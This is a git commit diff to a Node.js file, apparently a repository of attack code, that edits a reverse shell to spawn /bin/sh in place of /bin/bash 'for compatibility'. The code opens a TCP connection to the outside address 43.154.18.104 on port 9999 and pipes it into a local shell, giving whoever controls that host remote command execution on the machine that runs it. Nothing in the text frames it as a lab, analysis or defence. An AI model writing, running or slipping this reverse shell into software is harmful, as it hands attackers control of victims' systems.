81ebb589520fbb98f52c17b3e5e717987d1fea44
liqman <48323002+liqman@users.noreply.github.com>
2026-01-07 00:30:22 +0800

    Change shell from /bin/bash to /bin/sh for compatibility

--- 1.js
+++ 1.js
@@ -1,7 +1,7 @@
 (function(){
     var net = require("net"),
         cp = require("child_process"),
-        sh = cp.spawn("/bin/bash", []); // 使用 /bin/sh 兼容性最好
+        sh = cp.spawn("/bin/sh", []); // 使用 /bin/sh 兼容性最好
     var client = new net.Socket();
     client.connect(9999, "43.154.18.104", function(){
         client.pipe(sh.stdin);
